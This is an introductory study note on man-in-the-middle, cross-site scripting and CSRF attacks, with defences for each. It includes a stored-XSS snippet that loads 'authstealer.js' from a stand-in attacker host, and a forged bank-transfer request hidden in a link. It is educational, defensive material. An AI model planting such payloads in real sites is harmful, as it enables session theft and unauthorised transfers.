# Attacks

by Puteam :ru: 

## Man In The Middle (MITM)

### MITM - What is it?

![](https://vignette.wikia.nocookie.net/malcolminthemiddle/images/f/f4/Malcolm_in_the_Middle_Season_4.jpeg/revision/latest?cb=20150705220250 =300x)


A man-in-the-middle attack requires three players:
- victim
- the entity with which the victim is trying to communicate
- man in the middle

Critical to the scenario is that the victim isn’t aware of the man in the middle.


![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/man-in-the-middle-mitm.jpg)


Successful MITM execution has two distinct phases: **interception and decryption.**


With a traditional MITM attack, the cybercriminal needs to gain access to an unsecured or poorly secured Wi-Fi router.

Attacker can deploy tools to intercept and read the victim’s transmitted data or insert tools to read their interactions with websites. 

This info is then decrypted by the MITM.

With a man-in-the-browser attack (MITB), an attacker needs a way to inject malicious software, or malware, into the victim’s computer or mobile device. One of the ways this can be achieved is by phishing.

An example:

The Man in the Middle sends an email appearing to be from a victim's bank. The victim clicks the link and is directed to a site which looks just like their bank's website and enter's their account information - believing that they are interacting with their bank. The MITM has successfully gained the victim's info. 

![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUG6V_pUaHpVGnUqyxRJcYb7NHkUIeRkJUajTII5iMu90ZE2Ma)

### Types of Attack

- IP Spoofing
- DNS Spoofing
- HTTPS Spoofing
- SSL Spoofing
- WiFi Eavesdropping
- Email Hijacking
- Hijack Broswer Cookies

### MITM - How to defend against it 

 - Avoid unsecure WiFi connections or use a VPN when using these
 - Set strong router passwords
 - Be careful of phishing sites/emails
 - Avoid clicking links in suspucious emails, go direct to the site instead.

- Always use HTTPS sites
- Install Anti-Malware software

Authentication <br>
(Check each other's Certificates)

![](https://ugcorigin.s-microsoft.com/100/488459bc-c120-4e7b-a179-377f9bb41fc8/200/v1/image.jpg =200x)

Tamper detection <br>
To detect potential attacks, parties check for discrepancies in response times. 

![](https://jamjarshop.com/media/catalog/product/cache/1/image/9df78eab33525d08d6e5fb8d27136e95/t/a/tamperstrip_03_album_1_1.jpg)

![](http://giphygifs.s3.amazonaws.com/media/kj8M1xRRriY3m/giphy.gif)


## Cross Site Scripting (XSS)

Cross-site Scripting (XSS) is a **client-side code injection attack**.

Attacker includes malicious code included into legitimate web page or web application (=vehicle to deliver malicious script to the user’s browser)

The actual attack occurs when the victim visits the web page or web application that executes the malicious code. 

Consquences on user side: 
- user accounts may be compromised, 
- Trojan horse programs may be activated,
- page content may be modified to mislead users, 
- session cookies may be revealed, enabling a perpetrator to impersonate valid users and abuse their private accounts.


![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png)

- XSS does not directly target the application itself but the **users of the web application**
-  commonly used on websites that allow users to share content (forums, message boards etc.)

### Two types 

**Stored XSS (persistent XSS)**
Occurs when a malicious script is injected directly into a vulnerable web application & stored permanently on the target servers.

- victim retrieves the malicious script from the server when requesting service
- more damaging of the two
- increases the reach of the attack

Example:
``` html
Great price for a great item! 
Read my review here 
<script src=”http://hackersite.com/authstealer.js”> </script>.
```

**Reflected XSS (non-persistent attacks)**
Occur when a malicious script is reflected off of a web application to the victim’s browser.

- vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content. Examples: error message, search result etc.
- in order for the attack to be successful, the user needs to click on the infected link

### XSS - How to defend against it

> The two most common and useful XSS prevention mechanisms – filtering and escaping

**Filtering**
All external data is passed through a filter that removes dangerous keywords

- example keywords: the script tag, JavaScript commands, CSS styles, and other dangerous HTML markups
- A lot of code uses regular expressions for filtering and replacing
- but legitimate text is often removed

Hackers can bypass filters by using techniques such as hex encoding, Unicode character variations, line breaks, and null characters in strings. 

These techniques must all be catered for and that is why it is recommended to use some sort of library that has been tried and tested by the community at large.

Choose a library that is regularly maintained by a reliable source
 (for Javascript: OWASP Java Encoder Project) 


**Escaping**
User input is escaped i.e. key characters are converted into characters that are not interpreted as code by the browser. 

Example HTML: 
< and > characters (among others) need to be escaped i.e. turned into their entity equivalents which will not be interpreted as HTML tags by a browser.
```
&lt; and &gt;
```


The two most popular escaping libraries available are the ESAPI provided by OWASP and AntiXSS provided for Microsoft. 


## Cross Site Request Forgery (CSRF)

*...sometimes pronounced sea-surf*  🌊
*...also known as session-riding*  🏄‍♂️ 
*...it sounds cool...
...but it's* **dangerous** 😱



### CSRF - What is it?
Cross site request forgery (CSRF) is an attack vector that tricks a web browser into executing an unwanted action in an application to which a user is logged in.

CSRF attacks work because browser requests automatically include any credentials associated with the site, such as the user's session cookie, IP address, etc. 



![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/csrf-cross-site-request-forgery.png)

### Difference between XSS and CSRF

Cross-site scripting (XSS)
exploits the trust **a user**
has for **a particular site**.

Cross Site Request Forgery (CSRF)
exploits the trust that **a site**
has in **a user's browser**.


#### CSRF - Potential consequences?
A successful CSRF attack can be devastating for both the business and user. It can result in damaged client relationships, unauthorized fund transfers, changed passwords and data theft—including stolen session cookies.


### CSRF - History

- Known and reported since 2001.
- Few publicly reported expamples but...
- Netflix / Youtube have a history of vulnarability to CSRF in the noughties.



### CSRF - Example


Before executing an assault, a perpetrator typically studies an application in order to make a forged request appear as legitimate as possible. :mortar_board: :book: 


For example, a typical GET request for a $100 bank transfer might look like:

```

GET http://netbank.com/transfer.do?acct=PersonB&amount=$100 HTTP/1.1

```

A hacker can modify this script so it results in a $100 transfer to their own account. Now the malicious request might look like:

```
GET http://netbank.com/transfer.do?acct=AttackerA&amount=$100 HTTP/1.1
```



A bad actor can embed the request into an innocent looking hyperlink:

```
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>
```


Next, the attacker could distribute the hyperlink via email 💌 to a large number of bank customers. Those who click 🖱 on the link while logged into their bank account will unintentionally initiate the $100 transfer.

NB: that if a website is only using POST requests, it’s impossible to frame malicious requests using a <a> href tag. However, the attack could be delivered in a <form> tag.🗒



### CSRF - How to defend against it

😱 ***NO IDEA... SCREAM AND RUN*** 😱 



#### Synchroniser token pattern

A token, secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side.

```html
<input type="hidden" name="csrfmiddlewaretoken" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt" />
```

This token is generated by any method that ensures unpredictability and uniquenes.



### Other 

* Encryption based token pattern 
* HMAC Based Token Pattern
 
 PLUS other, non-token based ways. 
 

## Resrouces 

[MITM](https://us.norton.com/internetsecurity-wifi-what-is-a-man-in-the-middle-attack.html)
[MITM Wiki](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
[CSRF Defense Cheatsheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)
